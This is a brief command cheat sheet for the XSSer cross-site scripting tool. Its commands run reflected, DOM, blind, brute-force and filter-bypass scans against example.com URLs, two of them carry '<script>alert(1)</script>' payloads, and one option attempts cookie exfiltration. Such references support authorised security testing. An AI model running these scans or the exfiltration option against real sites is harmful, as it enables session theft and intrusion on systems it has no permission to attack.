## 🕸️ XSSer – Cross-Site Scripting Exploitation Tool

**XSSer** is a command-line tool designed to detect and exploit Cross-Site Scripting (XSS) vulnerabilities in web applications.  
It supports testing for reflected, stored, DOM-based, and blind XSS vulnerabilities using automated payload injection and analysis.

XSSer is useful for initial discovery, but modern applications often require manual validation.

### 🔹 Common XSSer Usage

```bash
# Basic scan for stored XSS (specific parameter)
xsser -u "https://www.example.com/profile?id=1" -c comment

# DOM-based XSS scan
xsser -u "https://www.example.com/page" --dom

# Scan multiple URLs from a file
xsser -l urls.txt

# Test XSS with cookies
xsser -u "https://www.example.com/login" --cookie "auth=12345"

# Reflected XSS test with payload
xsser -u "https://www.example.com/search?q=<script>alert(1)</script>"

# Blind XSS with custom payload
xsser -u "https://www.example.com/profile" -p name -vPayload "<script>alert(1)</script>"

# Attempt cookie exfiltration via XSS
xsser -u "https://www.example.com/profile" --cookie "auth=12345" -E

# Brute force XSS payloads
xsser -u "https://www.example.com/page" --brute

# Custom User-Agent header
xsser -u "https://www.example.com/page" -H "User-Agent: MyCustomUserAgent"

# Attempt XSS filter bypass
xsser -u "https://www.example.com/page" --filter-bypass

# Reduce output noise (useful for automation)
xsser --silent
